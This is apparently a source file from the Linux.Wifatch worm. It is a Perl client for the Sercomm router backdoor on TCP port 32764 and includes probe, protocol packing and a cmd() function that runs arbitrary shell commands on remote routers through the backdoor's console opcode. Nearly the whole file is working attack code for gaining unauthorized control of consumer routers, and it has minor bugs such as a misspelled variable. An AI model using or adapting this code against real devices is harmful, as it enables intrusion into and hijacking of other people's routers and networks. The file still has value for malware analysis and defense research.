#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package bn::ser;

# sercom router backdoor client

sub MAGIC() {0x53634d4d}
sub PORT()  {32764}

sub SCFG_WARNING     {-2}
sub SCFG_ERR         {-1}
sub SCFG_OK          {0}
sub SCFG_GETALL      {1}     # dump config
sub SCFG_GET         {2}     # get config var
sub SCFG_SET         {3}     # set config var
sub SCFG_COMMIT      {4}     # commit nvram
sub SCFG_TEST        {5}     # enable bridge mode
sub SCFG_ADSL_STATUS {6}     # show internet speed
sub SCFG_CONSOLE     {7}     # shell!
sub SCFG_RECEIVE     {8}     # write file to "tmp/$payload"
sub SCFG_VERSION     {9}     # return version
sub SCFG_LOCAL_IP    {10}    # return router ip
sub SCFG_RESTORE     {11}    # restore defaults
sub SCFG_CHECKSUM    {12}    # checksum mtdblock or so
sub SCFG_CFG_INIT    {13}    # dump nvram on disk and commit

# 14 exists, but what does it do?

sub TIMEOUT() {300}

our $VERBOSE = 0;

sub new
{
	my ($class, $ip) = @_;

	my $fh = bn::func::tcp_connect $ip, PORT, 20
		or return undef;

	syswrite $fh, "zollard_\x00\x00\x00\x00";
	my $res = bn::io::xread $fh, 12, 60;

	my $e =
		  (MAGIC == unpack "L<", $res) ? "<"
		: (MAGIC == unpack "L>", $res) ? ">"
		:                                return 0;

	bless [$ip, $e, $ip], $class;
}

sub req
{
	my ($self, $cmd, $payload) = @_;

	my ($ip, $e) = @$self;

	my $fh = bn::func::tcp_connect $ip, PORT, 20
		or return undef;

	# avoid unintended buffer overflow
	die "playload size exceeded"
		if 65520 < length $paylod;

	bn::io::xwrite $fh, pack "L${e}l${e}L${e}/a", MAGIC, $cmd, $payload;
	bn::io::xwrite $fh, $extra;

	my $res = bn::io::xread $fh, 12, TIMEOUT;

	defined $res
		or return;

	my ($magic, $status, $len) = unpack "L${e}l${e}L${e}", $res;

	return unless MAGIC == $magic;

	($status, bn::io::xread $fh, $len);
}

sub req_croak
{
	my ($self, $cmd, $payload) = @_;

	my ($status, $res) = $self->req($cmd, $payload);

	die "$self->[2]<$cmd> status $status"
		if $status;

	$res
}

sub cmd
{
	my ($self, $cmd) = @_;

	print "$self->[2] CMD<$cmd>\n" if $VERBOSE;
	my $out = $self->req_croak(SCFG_CONSOLE, "exec 2>&1; $cmd\x00");
	print "$self->[2] OUT<$out>\n" if $VERBOSE;

	$out
}

1

